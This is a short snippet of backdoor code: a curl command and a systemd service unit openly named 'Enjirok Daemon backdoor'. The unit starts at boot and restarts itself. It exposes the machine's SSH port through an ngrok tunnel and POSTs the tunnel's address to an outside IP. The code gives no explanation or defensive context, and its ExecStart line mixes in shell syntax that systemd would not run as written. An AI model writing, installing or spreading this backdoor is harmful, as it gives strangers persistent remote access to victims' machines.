curl -d  "$(curl 127.0.0.1:4040/api/tunnels)" -H "Content-Type: application/json" -X POST 154.53.61.106:19027/tunnel

[Unit]
Description=Enjirok Daemon backdoor
After=network.target
StartLimitIntervalSec=0
[Service]
Type=simple
Restart=always
RestartSec=1
ExecStart=/snap/bin/ngrok tcp 22 > /dev/null &;sleep 2 && /usr/bin/curl -d  "$(curl 127.0.0.1:4040/api/tunnels)" -H "Content-Type: application/json" -X POST 154.53.61.106:19027/tunnel

[Install]
WantedBy=multi-user.target
97711